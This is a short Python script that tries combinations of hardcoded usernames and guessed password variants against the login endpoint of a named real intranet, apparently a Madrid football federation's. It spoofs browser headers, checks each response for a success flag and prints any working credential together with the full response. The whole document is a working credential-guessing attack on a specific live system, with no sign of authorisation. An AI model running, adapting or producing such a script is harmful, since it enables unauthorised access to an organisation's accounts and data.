import requests
import re

url_login_submit = "https://intranet.ffmadrid.es/nfg/NLogin"
session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Referer": "https://intranet.ffmadrid.es/nfg/",
    "X-Requested-With": "XMLHttpRequest"
}

usernames = ["C30048", "30048", "C4239", "4239"]
passwords = [
    "INTRANET RFFM1.",
    "INTRANET RFFM1",
    "INTRANETRFFM1.",
    "INTRANETRFFM1",
    "INTRANET RFFM 1.",
    "INTRANET RFFM 1",
    "INTRANET RFFM",
    "INTRANETRFFM"
]

for usr in usernames:
    for pwd in passwords:
        payload = {
            "NUser": usr,
            "NPass": pwd,
            "LoginAjax": "1"
        }
        try:
            res = session.post(url_login_submit, data=payload, headers=headers)
            match_est = re.search(r'var estado="(\d+)"', res.text)
            match_err = re.search(r'var mensaje_error="([^"]*)"', res.text)
            estado = match_est.group(1) if match_est else "desconocido"
            error_msg = match_err.group(1) if match_err else "ninguno"
            
            if estado == "1":
                print(f"  >>> EXITO CON: Usuario={usr} | Clave={pwd} !!!")
                # Save a snippet of successful auth
                print("Response:", res.text)
                break
            # To avoid spamming, we can print progress only when it is not a 2 (incorrect credentials) or just keep going.
        except Exception as e:
            print("  Error:", e)
    else:
        continue
    break
print("Prueba de combinaciones finalizada.")
